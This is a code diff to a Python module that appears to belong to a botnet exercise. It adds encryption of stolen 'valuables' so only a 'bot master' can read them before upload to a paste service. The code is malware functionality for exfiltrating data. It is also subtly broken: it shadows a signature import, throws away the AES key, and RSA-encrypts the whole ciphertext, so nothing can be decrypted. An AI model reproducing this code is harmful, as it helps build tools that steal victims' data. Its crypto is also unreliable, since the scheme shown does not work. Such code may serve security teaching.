@@ -3,6 +3,12 @@ from Crypto.Signature import PKCS1_v1_5
 from Crypto.Hash import SHA256
 from Crypto.PublicKey import RSA
 
+from Crypto.Cipher import PKCS1_v1_5
+from Crypto.PublicKey import RSA
+from Crypto.Cipher import AES
+from Crypto import Random
+
+
 # Instead of storing files on disk,
 # we'll save them in memory for simplicity
 filestore = {}
@@ -16,7 +22,23 @@ def save_valuable(data):
 
 def encrypt_for_master(data):
     # Encrypt the file so it can only be read by the bot master
-    return data
+
+    # Generate key and IV for AES encryption with 256bits key size
+    key = os.urandom(32)
+    iv = Random.new().read(AES.block_size)
+    cipher = AES.new(key, AES.MODE_CFB, iv)
+    aes_msg = iv + cipher.encrypt(data)
+    print(aes_msg)  # Test print. TO BE REMOVE
+
+    # Obtain public key from text file for encrypting aes_msg
+    key = open("mypublickey.txt", "r").read()
+    encryption_key = RSA.importKey(key)
+    pub_key = PKCS1_v1_5.new(encryption_key)
+    encrypt_msg = pub_key.encrypt(aes_msg)
+    print(encrypt_msg)  # Test print. TO BE REMOVE
+    return encrypt_msg
+
+encrypt_for_master("Attack at dawn") # Test print. TO BE REMOVE
 
 def upload_valuables_to_pastebot(fn):
     # Encrypt the valuables so only the bot master can read them
